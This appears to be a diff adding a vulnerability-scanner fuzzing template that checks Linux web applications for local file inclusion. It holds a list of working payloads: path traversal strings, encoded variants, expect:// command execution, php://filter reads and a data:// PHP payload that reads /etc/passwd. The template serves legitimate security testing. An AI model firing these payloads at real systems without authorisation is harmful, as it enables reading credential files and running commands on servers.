@@ -1,0 +1,87 @@
+
+id: linux-lfi-fuzz
+
+info:
+  name: Local File Inclusion - Linux
+  author: DhiyaneshDK
+  severity: high
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+  metadata:
+    max-request: 46
+  tags: lfi,dast,linux
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      nix_fuzz:
+        - "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        - "/../../../../../../../../../../etc/passwd%00.html"
+        - "expect://id"
+        - ".././.././.././etc/passwd"
+        - "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        - "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        - "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00"
+        - "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        - "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd'"
+        - "/../../../../../../../../../../../etc/passwd%00.jpg"
+        - "../../../etc/passwd"
+        - "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        - "/../../../../../../../../../../etc/passwd%00.jpg"
+        - "../../../etc/passwd"
+        - "../../../../etc/passwd"
+        - "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd"
+        - "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+        - "../../../../../../../../etc/passwd%00"
+        - "expect://cat+/etc/passwd"
+        - "../../../../etc/passwd"
+        - "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        - "../../../../../../../../../../../etc/passwd%00"
+        - "../../../etc/passwd"
+        - "php://filter/convert.base64-decode/resource=data://plain/text,LXMzIwNjYg"
+        - "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00"
+        - ".././.././.././etc/passwd"
+        - "/../../../../../../../../../../etc/passwd^^"
+        - "php://filter/convert.base64-encode/resource=/etc/passwd"
+        - "expect://id"
+        - "%252e%252e%252fetc%252fpasswd"
+        - "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00"
+        - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+        - "%252e%252e%252fetc%252fpasswd"
+        - "../../../etc/passwd%00"
+        - "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
+        - "../../../../../../../../etc/passwd"
+        - "../../../../etc/passwd"
+        - "expect://id"
+        - "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
+        - "/..\\../..\\../..\\../..\\../etc/passwd"
+        - "../../../etc/passwd"
+        - "php://filter/convert.base64-decode/resource=data://plain/text,LXMzIwNjYg"
+        - "/../../../../../../../../../../etc/passwd%00.html"
+        - "../../../../../etc/passwd"
+        - "%252e%252e%252fetc%252fpasswd"
+        - "%252e%252e%252fetc%252fpasswd"
+        - "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd"
+        - "data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTs/Pg=="
+        - "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd"          
+
+    fuzzing:
+      - part: path
+        type: postfix # replaces existing parameter value with fuzz payload
+        mode: single # replaces all parameters value with fuzz payload
+        fuzz:
+          - '?page={{nix_fuzz}}'
+
+    stop-at-first-match: false
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+        
